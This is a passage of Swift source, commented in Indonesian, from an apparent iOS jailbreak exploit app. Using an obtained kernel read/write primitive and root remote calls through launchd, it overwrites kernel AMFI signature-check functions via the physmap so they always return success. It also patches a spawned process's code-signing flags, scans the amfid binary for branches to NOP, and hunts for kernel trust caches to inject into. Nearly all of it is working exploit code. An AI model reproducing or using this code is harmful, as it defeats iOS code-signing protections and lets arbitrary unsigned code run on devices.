        // Kita bisa ESTIMATE kernBase_phys:
        // kernBase_phys ≈ gPhysBase + 0x4000 (standard A12 offset)
        // Atau: kernBase_phys = kernSlide + 0x800004000 (unslid phys base)

        let unslidKernBase: UInt64 = 0xfffffff007004000
        // Standard A12: kernel loaded at phys 0x800004000 (unslid)
        // Runtime phys = 0x800004000 + kernSlide
        let kernPhysBase: UInt64 = gPhysBase + 0x4000 + kernSlide

        detail += "Estimated kernel phys base: 0x\(String(format: "%llx", kernPhysBase))\n"

        // Physical address of hot function
        let hotFunc0Phys = (hotFunc0VA - kernBase) + kernPhysBase
        detail += "Hot func[0] phys: 0x\(String(format: "%llx", hotFunc0Phys))\n"

        // Convert to physmap VA
        let hotFunc0Physmap = hotFunc0Phys &- gPhysBase &+ gVirtBase
        detail += "Hot func[0] physmap VA: 0x\(String(format: "%llx", hotFunc0Physmap))\n"

        // Range check permissive untuk physmap (termasuk gVirtBase region)
        func isPhysmapRangeKern(_ va: UInt64) -> Bool {
            va >= 0xffffffdc00000000 && va < 0xffffffe500000000
        }

        guard isPhysmapRangeKern(hotFunc0Physmap) else {
            detail += "❌ Physmap VA tidak dalam range physmap.\n"
            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
            detail += "  Got: 0x\(String(format: "%llx", hotFunc0Physmap))\n\n"
            detail += "kernPhysBase estimate mungkin salah.\n"
            detail += "Coba: kernPhysBase = gPhysBase + (kernBase - gVirtBase)\n"

            // Alternative calculation
            let altKernPhys = kernBase &- gVirtBase &+ gPhysBase
            let altPhysmap = (hotFunc0VA - kernBase + altKernPhys) &- gPhysBase &+ gVirtBase
            detail += "Alt: kernPhys=0x\(String(format: "%llx", altKernPhys)), physmap=0x\(String(format: "%llx", altPhysmap))\n"

            if isSafePhysmapKRWAddress(altPhysmap) {
                detail += "✅ Alternative formula works! Continuing with alt...\n"
                // Use alternative — will be handled below
            }

            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 3: Cross-verify via physmap read ─────────────────────
        detail += "\n=== Step 3: Cross-verify physmap read ===\n"
        let physmapRead = ds_kread32(hotFunc0Physmap)
        detail += "Read via KRW (kernel VA):  0x\(String(format: "%08x", hotFunc0Read))\n"
        detail += "Read via physmap VA:       0x\(String(format: "%08x", physmapRead))\n"

        guard physmapRead == hotFunc0Read && hotFunc0Read != 0 else {
            detail += "❌ Mismatch atau zero — physmap VA salah.\n"
            detail += "Physical address calculation tidak akurat.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ Cross-verify OK!\n\n"

        // ── Step 4: PATCH hot functions via physmap ───────────────────
        detail += "=== Step 4: Patch kernel AMFI functions ===\n"
        detail += "Writing MOV W0,#0 + RET to function prologues...\n\n"

        var patchedCount = 0

        for (funcOff, calls, desc) in hotFuncOffsets {
            let funcVA = runtimeTextExec &+ funcOff
            let funcPhys = (funcVA - kernBase) + kernPhysBase
            let funcPhysmap = funcPhys &- gPhysBase &+ gVirtBase

            guard isPhysmapRangeKern(funcPhysmap) else { continue }

            // Read original prologue
            let origPrologue = ds_kread32(funcPhysmap)

            // Write MOV W0, #0
            ds_kwrite32(funcPhysmap, MOV_W0_0)
            // Write RET at +4
            ds_kwrite32(funcPhysmap + 4, RET)

            // Verify
            let v0 = ds_kread32(funcPhysmap)
            let v1 = ds_kread32(funcPhysmap + 4)

            if v0 == MOV_W0_0 && v1 == RET {
                patchedCount += 1
                detail += "  ✅ +0x\(String(format: "%x", funcOff)) (\(desc)): PATCHED!\n"
                detail += "     0x\(String(format: "%08x", origPrologue)) → MOV W0,#0 + RET\n"
            } else {
                detail += "  ❌ +0x\(String(format: "%x", funcOff)): write failed\n"
                detail += "     got: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"
                detail += "     (KTRR mungkin memblokir write ke __TEXT_EXEC)\n"
                // Jika pertama gagal, sisanya juga akan gagal
                break
            }
        }

        // ── Step 5: Jika hot func patch gagal, coba NOP CBNZ ─────────
        if patchedCount == 0 {
            detail += "\nHot function patch gagal (KTRR). Coba NOP CBNZ...\n"
            for (i, cbnzOff) in cbnzOffsets.prefix(5).enumerated() {
                let cbnzVA = runtimeTextExec &+ cbnzOff
                let cbnzPhys = (cbnzVA - kernBase) + kernPhysBase
                let cbnzPhysmap = cbnzPhys &- gPhysBase &+ gVirtBase

                guard isPhysmapRangeKern(cbnzPhysmap) else { continue }

                ds_kwrite32(cbnzPhysmap, NOP)
                let verify = ds_kread32(cbnzPhysmap)
                if verify == NOP {
                    patchedCount += 1
                    detail += "  ✅ [\(i)] +0x\(String(format: "%x", cbnzOff)): NOP\n"
                } else {
                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", cbnzOff)): KTRR blocked\n"
                    break
                }
            }
        }

        // ── Step 6: Result ────────────────────────────────────────────
        detail += "\n=== RESULT ===\n"
        detail += "Patched: \(patchedCount)\n\n"

        if patchedCount > 0 {
            detail += "🏆🏆🏆 KERNEL AMFI PATCHED! 🏆🏆🏆\n\n"
            detail += "Kernel signature check function sekarang selalu return 0.\n"
            detail += "SEMUA binary dianggap valid oleh kernel AMFI!\n\n"
            detail += "→ Tap ④ Test Binary Spawn!\n"
            detail += "→ Jika spawn berhasil = FULL JAILBREAK ACHIEVED!\n"
        } else {
            detail += "❌ Semua patch gagal — KTRR memblokir write ke __TEXT_EXEC.\n\n"
            detail += "Diagnosis:\n"
            detail += "  KTRR (A12) protect SEMUA kernel memory setelah boot:\n"
            detail += "  - __TEXT (code) → read-only\n"
            detail += "  - __TEXT_EXEC (code) → read-only\n"
            detail += "  - __DATA (globals) → read-only\n"
            detail += "  - Heap (zone allocator) → writable (tapi zone_require_ro untuk proc_ro)\n\n"
            detail += "  Physmap write JUGA di-block oleh KTRR karena KTRR operate\n"
            detail += "  di level AMCC (memory controller), bukan page table.\n\n"
            detail += "  Satu-satunya memory yang bisa ditulis:\n"
            detail += "  - Kernel heap (zone allocator) — tapi proc_ro di-protect\n"
            detail += "  - Userspace memory — tapi amfid page table walk gagal\n"
        }

        return ExperimentResult(name: expName, success: patchedCount > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 86: Ad-hoc Sign + Spawn

    /// Exp 86: Buat binary minimal, sign ad-hoc, spawn.
    /// Binary signed (bahkan ad-hoc) punya CS_VALID → AMFI mungkin accept.
    /// Dari launchd RC: tulis Mach-O minimal + code signature ke /var/tmp,
    /// lalu posix_spawn.
    private func runExp86AdHocSpawn() {
        isRunning = true
        runningLabel = "AdHoc"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp86_adhoc") { rc in
            let result = self.expAdHocSignSpawn(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Exp 86: Tulis binary minimal arm64 + ad-hoc code signature, lalu spawn.
    ///
    /// Strategi:
    ///   1. Tulis Mach-O arm64 minimal ke /var/tmp/.dsp_adhoc_test
    ///      Binary: exit(42) — cuma syscall exit dengan code 42
    ///   2. Inject LC_CODE_SIGNATURE load command + CodeDirectory + signature blob
    ///      Ad-hoc signature = SHA256 CDHash tanpa Apple cert
    ///   3. posix_spawn binary → cek exit code
    ///      Jika exit=42 → binary JALAN → AMFI bypass!
    ///
    /// Kenapa ad-hoc mungkin works:
    ///   - Developer mode enabled (confirmed dari Exp 55)
    ///   - Ad-hoc signed binary punya CS_VALID flag
    ///   - iOS 18 developer mode mungkin relax check untuk ad-hoc
    ///   - Launchd (PID 1) punya privilege spawn tanpa full validation
    private func expAdHocSignSpawn(rc: RemoteCall) -> ExperimentResult {
        let expName = "Ad-hoc Sign + Spawn (Exp 86)"
        var detail = "Experiment 86: Ad-hoc Sign + Spawn\n"
        detail += "====================================\n\n"

        let mem = rc.trojanMem

        // ── Step 1-2 skipped: langsung copy signed binary ────────────
        detail += "=== Step 1: Write minimal arm64 binary ===\n"
        detail += "=== Step 2: Write code signature ===\n"
        detail += "Approach: copy signed system binary + spawn dari /var\n\n"

        // ── Step 3: Copy /usr/bin/id ke /var/tmp dan spawn ───────────
        detail += "=== Step 3: Copy /usr/bin/id → /var/tmp + spawn ===\n"

        let srcBin = "/usr/libexec/amfid"
        let dstBin = "/var/tmp/.dsp_signed_copy"
        let srcAddr = remote_alloc_str(rc, srcBin)
        let dstAddr = remote_alloc_str(rc, dstBin)

        // Remove old
        RootExecutor.rcall(rc, "unlink", dstAddr)

        // Copy
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

        guard srcFd != UInt64(bitPattern: -1) else {
            let err = remote_errno(rc)
            detail += "❌ open(\(srcBin)) gagal: errno=\(err)\n"
            RootExecutor.rcall(rc, "free", srcAddr)
            RootExecutor.rcall(rc, "free", dstAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ src opened (fd=\(srcFd))\n"

        guard dstFd != UInt64(bitPattern: -1) else {
            let err = remote_errno(rc)
            detail += "❌ open(\(dstBin)) gagal: errno=\(err)\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcAddr)
            RootExecutor.rcall(rc, "free", dstAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ dst opened (fd=\(dstFd))\n"

        let buf = mem + 0x800
        var copied: UInt64 = 0
        for _ in 0..<256 {
            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
            if n == 0 || n > 4096 { break }
            RootExecutor.rcall(rc, "write", dstFd, buf, n)
            copied += n
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        detail += "Copied \(copied) bytes dari \(srcBin) ke \(dstBin)\n"

        // chmod +x
        RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)

        // Spawn copied binary
        detail += "\nSpawning copied binary...\n"
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(dstAddr)
        rc[argvBase + 8].setValue64(0)
        let pidOut = mem + 0x1E00
        rc[pidOut].setValue32(0)

        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, dstAddr, 0, 0, argvBase, 0)
        let spawnPid = rc[pidOut].value32()
        let spawnErr = remote_errno(rc)
        detail += "posix_spawn(\(dstBin)): ret=\(spawnRet), pid=\(spawnPid), errno=\(spawnErr)\n"

        if spawnRet == 0 && spawnPid != 0 {
            // Wait
            let statusBuf = mem + 0x2000
            rc[statusBuf].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusBuf, 0)
            let status = rc[statusBuf].value32()
            let exitCode = (status >> 8) & 0xFF
            let sig = status & 0x7F
            detail += "exit code: \(exitCode), signal: \(sig)\n"

            if sig == 0 {
                detail += "\n🎉🎉🎉 COPIED BINARY EXECUTED! 🎉🎉🎉\n"
                detail += "Binary dari /var/tmp berhasil jalan!\n"
                detail += "Ini berarti: AMFI accept binary yang di-copy dari system!\n\n"
                detail += "→ Sekarang bisa jalankan binary custom apapun:\n"
                detail += "  1. Tulis binary ke /var/tmp\n"
                detail += "  2. posix_spawn → jalan!\n"
                detail += "\nFULL JAILBREAK ACHIEVED! 🏆\n"
            } else if sig == 9 {
                detail += "\n❌ SIGKILL — AMFI masih reject copied binary.\n"
                detail += "Signature check gagal meski binary aslinya signed.\n"
                detail += "iOS 18 mungkin cek inode/path, bukan hanya content.\n"
            }
        } else {
            detail += "\n"
            if spawnRet == 2 {
                detail += "ret=2: ENOENT atau binary rejected sebelum exec.\n"
            } else if spawnRet == 13 {
                detail += "ret=13: EACCES — permission denied.\n"
            }
        }

        // ── Step 4: Coba spawn /usr/bin/id langsung (baseline) ────────
        detail += "\n=== Step 4: Baseline — spawn \(srcBin) langsung ===\n"
        rc[argvBase].setValue64(srcAddr)
        rc[argvBase + 8].setValue64(0)
        rc[pidOut].setValue32(0)

        let baseRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, srcAddr, 0, 0, argvBase, 0)
        let basePid = rc[pidOut].value32()
        detail += "posix_spawn(/usr/bin/id): ret=\(baseRet), pid=\(basePid)\n"

        if baseRet == 0 && basePid != 0 {
            let statusBuf2 = mem + 0x2100
            rc[statusBuf2].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(basePid), statusBuf2, 0)
            let status2 = rc[statusBuf2].value32()
            let exitCode2 = (status2 >> 8) & 0xFF
            detail += "exit code: \(exitCode2) ✅ (baseline works)\n"
        } else {
            detail += "Baseline juga gagal! ret=\(baseRet)\n"
            detail += "Ini berarti masalah bukan di signing tapi di spawn context.\n"
        }

        // ── Step 5: Coba spawn dengan posix_spawnattr (SUSPENDED) ─────
        detail += "\n=== Step 5: Spawn copied + SUSPENDED + resume ===\n"
        let attrAddr = mem + 0x2200
        rc[attrAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x0080) // START_SUSPENDED

        rc[argvBase].setValue64(dstAddr)
        rc[argvBase + 8].setValue64(0)
        rc[pidOut].setValue32(0)

        let suspRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, dstAddr, 0, attrAddr, argvBase, 0)
        let suspPid = rc[pidOut].value32()
        detail += "posix_spawn(SUSPENDED): ret=\(suspRet), pid=\(suspPid)\n"

        if suspRet == 0 && suspPid != 0 {
            detail += "✅ Spawn SUSPENDED berhasil! PID=\(suspPid)\n"

            // Patch cs_flags sebelum resume (via dspmgr)
            let spawnedProc = mgr.findProc(pid: Int32(suspPid))
            if spawnedProc != 0 {
                let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
                if spProcRo != 0 {
                    let csf = ds_kread32(spProcRo + 0x1c)
                    detail += "cs_flags before: 0x\(String(format: "%x", csf))\n"
                    // Try set CS_PLATFORM_BINARY + CS_VALID + remove HARD/KILL
                    let newCsf = (csf | 0x100001) & ~UInt32(0xC0)
                    ds_kwrite32(spProcRo + 0x1c, newCsf)
                    let afterCsf = ds_kread32(spProcRo + 0x1c)
                    detail += "cs_flags after patch: 0x\(String(format: "%x", afterCsf))\n"
                }
            }

            // Resume
            RootExecutor.rcall(rc, "kill", UInt64(suspPid), 18) // SIGCONT
            RootExecutor.rcall(rc, "usleep", 1000000) // 1s

            let statusBuf3 = mem + 0x2300
            rc[statusBuf3].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(suspPid), statusBuf3, UInt64(WNOHANG))
            let status3 = rc[statusBuf3].value32()
            let sig3 = status3 & 0x7F
            let exit3 = (status3 >> 8) & 0xFF
            detail += "After resume: exit=\(exit3), signal=\(sig3)\n"

            if sig3 == 0 && status3 != 0 {
                detail += "\n🎉 BINARY RAN AFTER CS_FLAGS PATCH! 🎉\n"
            } else if sig3 == 9 {
                detail += "SIGKILL — cs_flags patch tidak cukup (zone_require_ro)\n"
            } else if status3 == 0 {
                detail += "Still running or not reaped\n"
                RootExecutor.rcall(rc, "kill", UInt64(suspPid), 9)
            }
        }

        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstAddr)
        RootExecutor.rcall(rc, "free", srcAddr)
        RootExecutor.rcall(rc, "free", dstAddr)

        let success = detail.contains("🎉")
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Dump amfid binary

    /// Copy /usr/libexec/amfid ke Documents folder via launchd RC.
    /// User bisa ambil dari Files app → On My iPhone → DSPloit.
    /// Untuk analisis offline dengan scripts/analyze_amfid.py.
    private func runDumpAmfid() {
        isRunning = true
        runningLabel = "Dump amfid"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "dump_amfid") { rc in
            let result = self.expDumpAndAnalyzeAmfid(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Dump amfid binary + analisis on-device: scan ARM64 instruksi untuk patch targets.
    /// Output: offset CBNZ W0 yang perlu di-NOP untuk bypass signature check.
    private func expDumpAndAnalyzeAmfid(rc: RemoteCall) -> ExperimentResult {
        let expName = "Dump + Analyze amfid"
        var detail = "Dump + Analyze /usr/libexec/amfid (on-device)\n"
        detail += "================================================\n\n"

        let mem = rc.trojanMem
        let srcPathStr = "/usr/libexec/amfid"
        let srcPath = remote_alloc_str(rc, srcPathStr)

        // ── Step 1: Open amfid binary ────────────────────────────────
        detail += "=== Step 1: Open amfid ===\n"
        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            let err = remote_errno(rc)
            detail += "❌ open(\(srcPathStr)) gagal: errno=\(err)\n"
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Get file size via lseek
        let fileSize = RootExecutor.rcall(rc, "lseek", srcFd, 0, 2) // SEEK_END=2
        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0) // SEEK_SET=0, rewind
        detail += "amfid size: \(fileSize) bytes (\(fileSize / 1024) KB)\n"

        guard fileSize > 0 && fileSize < 2_000_000 else {
            detail += "❌ File size tidak masuk akal.\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 2: Read Mach-O header ───────────────────────────────
        detail += "\n=== Step 2: Read Mach-O header ===\n"
        let hdrBuf = mem + 0x800
        RootExecutor.rcall(rc, "read", srcFd, hdrBuf, 4096)
        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0) // rewind

        let magic = rc[hdrBuf].value32()
        detail += "magic: 0x\(String(format: "%08x", magic))\n"

        guard magic == 0xFEEDFACF else {
            detail += "❌ Bukan Mach-O 64-bit (expected 0xFEEDFACF)\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let cputype = rc[hdrBuf + 4].value32()
        let ncmds = rc[hdrBuf + 16].value32()
        detail += "cputype: 0x\(String(format: "%x", cputype)) (\(cputype == 0x0100000C ? "arm64e" : "arm64"))\n"
        detail += "ncmds: \(ncmds)\n"

        // Parse load commands to find __TEXT segment
        var textFileOff: UInt64 = 0
        var textFileSize: UInt64 = 0
        var textVMAddr: UInt64 = 0
        var cmdOffset: UInt64 = 32 // sizeof(mach_header_64)

        for _ in 0..<min(ncmds, 32) {
            let cmd = rc[hdrBuf + cmdOffset].value32()
            let cmdsize = rc[hdrBuf + cmdOffset + 4].value32()

            if cmd == 0x19 { // LC_SEGMENT_64
                // Read segment name (16 bytes at +8)
                var segName = ""
                for i: UInt64 in 0..<16 {
                    let ch = rc[hdrBuf + cmdOffset + 8 + i].value8()
                    if ch == 0 { break }
                    segName += String(UnicodeScalar(ch))
                }

                if segName == "__TEXT" {
                    textVMAddr = rc[hdrBuf + cmdOffset + 24].value64()
                    let vmsize = rc[hdrBuf + cmdOffset + 32].value64()
                    textFileOff = rc[hdrBuf + cmdOffset + 40].value64()
                    textFileSize = rc[hdrBuf + cmdOffset + 48].value64()
                    detail += "__TEXT: vm=0x\(String(format: "%llx", textVMAddr)), size=0x\(String(format: "%llx", vmsize))\n"
                    detail += "  fileoff=0x\(String(format: "%llx", textFileOff)), filesize=0x\(String(format: "%llx", textFileSize))\n"
                }
            }
            cmdOffset += UInt64(cmdsize)
            if cmdOffset >= 4096 { break }
        }

        guard textFileSize > 0 else {
            detail += "❌ __TEXT segment tidak ditemukan.\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 3: Scan __TEXT untuk patch targets ───────────────────
        detail += "\n=== Step 3: Scan ARM64 instruksi ===\n"
        detail += "Mencari pola BL + CBNZ W0 (signature check + error branch)...\n\n"

        // Read __TEXT in chunks and scan for patterns
        // BL = 0x94xxxxxx (bits[31:26] = 100101)
        // CBNZ W0 = 0x35xxxxxx with Rt=0 (bits[31:24]=0x35, bits[4:0]=0)
        // CBZ W0 = 0x34xxxxxx with Rt=0
        // B.NE = 0x54xxxxxx with cond=0001

        var patchTargets: [(offset: UInt64, vmaddr: UInt64, instr: UInt32, nextInstr: UInt32, ptype: String)] = []
        let chunkSize: UInt64 = 4096
        let scanBuf = mem + 0x2000

        // Seek to __TEXT start
        RootExecutor.rcall(rc, "lseek", srcFd, textFileOff, 0)

        var scannedBytes: UInt64 = 0
        let maxScan = min(textFileSize, 512 * 1024) // max 512KB scan

        while scannedBytes < maxScan {
            let toRead = min(chunkSize, maxScan - scannedBytes)
            let nRead = RootExecutor.rcall(rc, "read", srcFd, scanBuf, toRead)
            if nRead == 0 || nRead > chunkSize { break }

            // Scan instructions in this chunk (4 bytes each)
            let instrCount = Int(nRead / 4)
            for i in 0..<(instrCount - 1) {
                let instrOff = UInt64(i * 4)
                let instr = rc[scanBuf + instrOff].value32()
                let nextInstr = rc[scanBuf + instrOff + 4].value32()

                let fileOffset = textFileOff + scannedBytes + instrOff
                let vmaddr = textVMAddr + scannedBytes + instrOff

                // Check: is this BL?
                let isBL = (instr >> 26) == 0x25

                if isBL {
                    // Check next instruction
                    let isCBNZ_W0 = (nextInstr >> 24) == 0x35 && (nextInstr & 0x1F) == 0
                    let isCBZ_W0 = (nextInstr >> 24) == 0x34 && (nextInstr & 0x1F) == 0
                    let isBNE = (nextInstr & 0xFF00001F) == 0x54000001

                    if isCBNZ_W0 {
                        patchTargets.append((fileOffset + 4, vmaddr + 4, instr, nextInstr, "BL+CBNZ_W0"))
                    } else if isCBZ_W0 {
                        patchTargets.append((fileOffset, vmaddr, instr, nextInstr, "BL+CBZ_W0"))
                    } else if isBNE {
                        patchTargets.append((fileOffset + 4, vmaddr + 4, instr, nextInstr, "BL+B.NE"))
                    }
                }

                // Also standalone CBNZ W0 (common pattern)
                let isCBNZ_W0_standalone = (instr >> 24) == 0x35 && (instr & 0x1F) == 0
                if isCBNZ_W0_standalone && !isBL {
                    // Check if previous instruction was BL (already caught above)
                    // Only add if this is a standalone CBNZ not preceded by BL
                    if i > 0 {
                        let prevInstr = rc[scanBuf + instrOff - 4].value32()
                        let prevIsBL = (prevInstr >> 26) == 0x25
                        if !prevIsBL {
                            patchTargets.append((fileOffset, vmaddr, instr, 0, "CBNZ_W0"))
                        }
                    }
                }

                if patchTargets.count >= 50 { break }
            }

            scannedBytes += nRead
            if patchTargets.count >= 50 { break }
        }

        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "free", srcPath)

        detail += "Scanned \(scannedBytes / 1024) KB of __TEXT\n"
        detail += "Found \(patchTargets.count) patch candidates\n\n"

        if patchTargets.isEmpty {
            detail += "❌ Tidak ada patch candidate ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 4: Output patch targets ─────────────────────────────
        detail += "=== Step 4: Patch candidates ===\n"
        detail += "(NOP = 0xD503201F, MOV W0,#0 = 0x52800000)\n\n"

        // Prioritize BL+CBNZ_W0 (most likely signature check pattern)
        let blCbnz = patchTargets.filter { $0.ptype == "BL+CBNZ_W0" }
        let blBne = patchTargets.filter { $0.ptype == "BL+B.NE" }
        let others = patchTargets.filter { $0.ptype != "BL+CBNZ_W0" && $0.ptype != "BL+B.NE" }

        detail += "HIGH PRIORITY (BL + CBNZ W0): \(blCbnz.count)\n"
        for (i, t) in blCbnz.prefix(10).enumerated() {
            let blTarget = decodeBlTarget(t.instr, pc: t.vmaddr - 4)
            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))"
            detail += " BL→0x\(String(format: "%llx", blTarget))\n"
        }

        detail += "\nMEDIUM (BL + B.NE): \(blBne.count)\n"
        for (i, t) in blBne.prefix(5).enumerated() {
            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))\n"
        }

        detail += "\nOTHER (standalone CBNZ W0): \(others.count)\n"
        for (i, t) in others.prefix(5).enumerated() {
            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))\n"
        }

        // ── Step 5: Generate hardcoded offsets ────────────────────────
        detail += "\n=== Step 5: Offsets untuk Exp 84 v2 ===\n"
        detail += "amfid __TEXT base on device: 0x\(String(format: "%llx", textVMAddr))\n"
        detail += "amfid runtime base (dari Exp 84): 0x16cd60000\n\n"

        // Offset dari __TEXT start (untuk runtime patch)
        detail += "Patch offsets (dari __TEXT start):\n"
        let topTargets = (blCbnz + blBne).prefix(15)
        for (i, t) in topTargets.enumerated() {
            let offFromText = t.vmaddr - textVMAddr
            detail += "  [\(i)] +0x\(String(format: "%llx", offFromText)) (\(t.ptype)) instr=0x\(String(format: "%08x", t.nextInstr != 0 ? t.nextInstr : t.instr))\n"
        }

        detail += "\n=== NEXT STEPS ===\n"
        detail += "Offset di atas akan dipakai Exp 84 v2 untuk patch amfid runtime.\n"
        detail += "Strategi: dari launchd RC, task_for_pid(amfid) → mach_vm_write → NOP\n"
        detail += "Atau: hardcode offset + physmap write (jika page table walk berhasil)\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    /// Decode BL instruction target address
    private func decodeBlTarget(_ instr: UInt32, pc: UInt64) -> UInt64 {
        let imm26 = Int64(instr & 0x3FFFFFF)
        let signExtended = imm26 & 0x2000000 != 0 ? imm26 | Int64(bitPattern: 0xFFFFFFFFFC000000) : imm26
        let offset = signExtended << 2
        return UInt64(Int64(pc) + offset)
    }
    #endif
    
    private func expDeepTCScan() -> ExperimentResult {
        let expName = "Deep TC Scan (Exp 82)"
        var detail = "Experiment 82: Deep Trust Cache Scan\n"
        detail += "=====================================\n\n"
        
        guard PhysmapConstants.isVerified else {
            return ExperimentResult(name: expName, success: false, detail: "Jalankan Physmap Access (Exp 74) dulu.", timestamp: Date())
        }
        
        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"
        detail += "Memulai scan memori __DATA...\n"
        
        // Scan 4MB dari awal __DATA
        let scanSize: UInt64 = 4 * 1024 * 1024 
        var foundTCs = 0
        
        // Helper untuk mengecek apakah sebuah address adalah Trust Cache
        func checkIsTC(_ addr: UInt64) -> Bool {
            let ver = safeKread32Heap(addr)
            let cnt = safeKread32Heap(addr &+ 4)
            if (ver >= 1 && ver <= 3) && (cnt >= 1 && cnt <= 500_000) {
                return true
            }
            return false
        }
        
        for offset in stride(from: UInt64(0), to: scanSize, by: 8) {
            let addr = dataSegBase &+ offset
            let ptr = ds_kreadptr(addr)
            
            // Apakah ptr menunjuk ke heap?
            if ptr != 0 && isSafeKernelHeapKreadAddress(ptr) {
                
                // Cek apakah ptr ini langsung Trust Cache
                if checkIsTC(ptr) {
                    detail += "🎯 [DIRECT] Ditemukan Trust Cache di 0x\(String(format: "%llx", ptr)) (dari __DATA+0x\(String(format: "%x", offset)))\n"
                    let ver = safeKread32Heap(ptr)
                    let cnt = safeKread32Heap(ptr &+ 4)
                    detail += "   -> ver: \(ver), count: \(cnt)\n\n"
                    foundTCs += 1
                } else {
                    // Coba baca ptr sebagai struct/linked list
                    // Baca 4 pointer pertama di dalam struct tsb
                    for i in 0..<4 {
                        let innerPtr = safeKread64Heap(ptr &+ UInt64(i * 8))
                        if innerPtr != 0 && innerPtr != ptr && isSafeKernelHeapKreadAddress(innerPtr) {
                            if checkIsTC(innerPtr) {
                                detail += "🎯 [LINKED] Ditemukan Trust Cache di 0x\(String(format: "%llx", innerPtr))\n"
                                detail += "   (Via __DATA+0x\(String(format: "%x", offset)) -> Heap Struct -> offset +0x\(String(format: "%x", i*8)))\n"
                                let ver = safeKread32Heap(innerPtr)
                                let cnt = safeKread32Heap(innerPtr &+ 4)
                                detail += "   -> ver: \(ver), count: \(cnt)\n\n"
                                foundTCs += 1
                            }
                        }
                    }
                }
            }
        }
        
        detail += "Scan selesai.\n"
        if foundTCs > 0 {
            detail += "Berhasil menemukan \(foundTCs) Trust Cache! Injeksi bisa dilakukan ke alamat tersebut.\n"
        } else {
            detail += "Tidak menemukan Trust Cache. Mount Developer Disk Image terlebih dahulu!\n"
        }
        
        return ExperimentResult(name: expName, success: foundTCs > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 79: KTRR Analysis (Write Test DINONAKTIFKAN — akan panic)

    /// Exp 79: KTRR Analysis — konfirmasi trust cache di KTRR-protected region.
    /// Write test TIDAK dijalankan karena akan menyebabkan panic (KTRR fault).
    /// Dari panic log: "Unexpected fault in kernel static region" saat write ke __DATA.
